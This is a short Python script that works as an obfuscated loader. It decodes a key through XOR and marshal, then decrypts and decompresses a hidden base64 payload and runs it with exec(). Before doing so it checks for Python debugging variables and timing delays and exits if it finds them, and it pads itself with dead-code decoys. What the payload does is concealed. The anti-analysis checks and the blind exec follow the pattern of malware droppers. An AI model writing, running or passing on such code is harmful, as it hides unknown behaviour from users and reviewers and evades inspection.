
import base64 as LVFOQKFw, zlib as DsHZsrVD, marshal as mYEHfIBP, hashlib as __h, os as iubpDUtz, sys as hzkNuXmK, time as FnkifTQp

GefsjZJI = 5290
JlQeholQ = 'lDidYI4yqyUM'
iPZWpdum = lambda x: x

def dmnwLwXa():
    x = 0
    for i in range(5):
        x += i
    return x


AnqNvmyU = [22, 49, 36, 39, 41, 32, 14, 42, 33, 44, 119, 116, 22, 36, 41, 49, 22, 49, 55, 44, 43, 34, 36, 113, 12, 42]
jLLTWnkA = 69
GObPDnBU = ''.join(chr(b ^ jLLTWnkA) for b in AnqNvmyU)
AuSqqFOi = __h.sha256(GObPDnBU.encode()).digest()

def UzvdyFeO():
    suspicious = ['PYTHONINSPECT', 'PYTHONDEBUG', 'PYTHONVERBOSE']
    for v in suspicious:
        if iubpDUtz.environ.get(v):
            hzkNuXmK.exit(1)
    t1 = FnkifTQp.time()
    FnkifTQp.sleep(0.1)
    t2 = FnkifTQp.time()
    if t2 - t1 > 0.5:
        hzkNuXmK.exit(1)

UzvdyFeO()

sTrYpCtL_data = ["Kp/GAznc64xXooXqecKthrXsT4kWHWF+F1UL1efRZ6gJ0uNAp6gAo54J9YSi28Ik/9PwnJsW/viF53QQREGndXIb6oUYBaHlB5Hod/S+KZblnsYagylMbggh", "AkK5Ki8nUPwwdI8DbaJhLowMljaadbZKvZCuzCjO077DQypisti/RmuC2BFiztk6KPdl60M0lRRd8J+KnfhywiGawmLfvqZyx9Gmanc5z+88+Olu7TUrGLYO", "MZhwv804Loc++kQ37JoSEzPwU4WjOAUjtsdwCb/ZindWkoq1FlffjJVR5MyIa36pVktN8/VLUD26PJJ+S6xUVMY1RPXxDSMwoXUI9a2PnM/Upo5JIMh0O4Ec", "4WrtFb4XJlh3v1NNpsqkUa7EiLx9gv0suohZnih4p7C64i3C5oXlqFy8PjLqelS76UENyTLbHKpNbsw8OmMMSTfMI2KZYi34lIKDdkTExLxcRkKhPs53XFoU", "46l4dvl32zNwZV5OZUQkGOITD3ZuUnwnMV7Ym3hvA0pLBDuy0vtMSYCYr8K+aGlHO76LDwvEELZBNhazgCZk/84Y1JSnHA57rZJoswaZcSYIzCt5b+DX4RLo", "u6ceyjIQ3+HkNQDBpv3M7rUxUsFxQCaRKG/tEa7UqavoEOVW4URvIxkZn3Gwv+QUrtZgPQi318xOMeszT3hOcy0ymYetK7SvZKEqdHSWUsGqSUuzGlRblurP", "4TB0xoHwaf6dg8I0qqKGmMKatgv6G3TVeRCycYiTWI9jkmRz6BLp8KkQ75WeAVWP5WeHK2yRZNQR8yyRAKrniG6YxtACGcFLcMrK3Pjh+pwYwUBn6+IohHPt", "+YJ6dbWLOO7aJaMedfjDrvTTNMCgj4RklUiHpCW9RUdMIYvEhgPNqp7XA3inSIvn5kS6I0EzKyVROYRrWwuDZYYqhnAfU1zQQVBidHHpPfLznQx95rBO8TAl", "W2EqTFSwMJrqBVdC/lSckkCJtsTrqHR+kvXhH11AJuRRGhwzfOrHyn51fMVIGFlo1I41n5ADyCzgMN3rhA5BkBUCDrEVM1+pOk3OlcIWmFBCarpY5Xa4NQtY", "y6MJ/oU6k+BIPNOd6osBxk08YzlIPAo+6x8jg4vTFJFcJV6YjVsVJneN2GdO6L7vxORXPmCSjCdiYRNZdOFtR3wjh+bjqBJCOJobILM1X+UvigONpmfgLNie", "WXYPQSR0T/vn5/rsaMPvM38q8wZKF3ZjZ3fSRxGnkMlA17vpmXcWc3ElmRnyH48pAOaaDVw+KLyySVyAi3bXnmFrHtBtMSy13RoHPzSnid0TALs7aZp0E/FN", "52cPyLx2ATZbxiQKqon09bnoukznbhgvgV2QVlkqMeahnczOMi6Wmww4Fxg3dVTQA8UerZmBDmhWhwiOx1R4IJp98NhHZbzxZ+KXmg8Eb3RQl3gd7GQjRLDr", "PFoHo2RFnagpnlsaxMVryzldKq76NpFXmuWe2HoOTL635pKNE3UyhGTcEtryuZ5x0cD768NpdNFTgwOFiOIV73AeGN+V0FC9w4q8fiejRHIMZTRTLmYZ8djP", "0uWmwlqZTnp93eGTVsdUe2amfdHvyvB4yYpxXd1k7abFRQahgP8qtN7fgOshDJSk8PJk/FzWe/JezECd6/rVxXnRzNuGDkU0PMWMFkfeSzQTHE0KghTcfibY", "pnNkwSTQKAJpKuxhf2ATk91OsyfgQfsIYnQgqKkhhX3SlPdhZ7ZCOBgb7dtQwS7D5XARnkejyTjVZ/swsncCSq8bu8eYfTplCE+vt0tKkI8dIH5kCd91FJqj", "B1q8EY7CnJeGfswbo8Jx4RsTsl1RDtNQFxet4p3Q4QGqpLOCOHhMGKTZF4CJyeU8FJeR3I2fsq/3uW8MZleBGqKqjPKZiiF9Ra6Urcp+b7mOqI3TcjuShwHq", "X4XH0Ebaolg0NsDxXVs8qLrhRXOpUE+sfYjlkq4tJEvu0wJRr/y1AiBd8RcCUkuDMWAVV+HGsd9r7v1Sokw5UteeGHWlrg//7IziWB24S10AQFmEHZpA7DJI", "tbH2TiWApEnNIIIdbnTS9Bww1rzIBwnx1WKAFInH3R/CbAK+CfcREh81gWo2lmK4/oXm0TffQPJ/TpmdQrYrUSoynyipqpByedHtTPmztuXdTEE3Ng6RCqxg", "1ycoVV7T9vtNzbSnaXstXxjroxp/Ax7xtiWaHnKlqThtFXKZbmX0dWliSuV7s2E9sUkQrEylqX9Z"]
sTrYpCtL_key = ["8xEAAAAQnhQhlBrVJ0s1vCc1zVqQYA=="]

sTrYpCtL_data_joined = ''.join(sTrYpCtL_data)
sTrYpCtL_key_joined = ''.join(sTrYpCtL_key)

bhJteRXc = LVFOQKFw.b64decode(sTrYpCtL_key_joined)
ZtVkCpQJ = mYEHfIBP.loads(bhJteRXc)
RQuBMPkJ = bytes([b ^ AuSqqFOi[i % len(AuSqqFOi)] for i, b in enumerate(ZtVkCpQJ)]).decode()

sTrYpCtL_enc = LVFOQKFw.b64decode(sTrYpCtL_data_joined)
rEHoPgAE = bytes([b ^ ord(RQuBMPkJ[i % len(RQuBMPkJ)]) for i, b in enumerate(sTrYpCtL_enc)])
bhsDHPBK = DsHZsrVD.decompress(rEHoPgAE)

if 1 == 2:
    print("This never runs")
while False:
    print("Nor does this")
try:
    assert 1 == 0
except:
    pass

exec(bhsDHPBK)
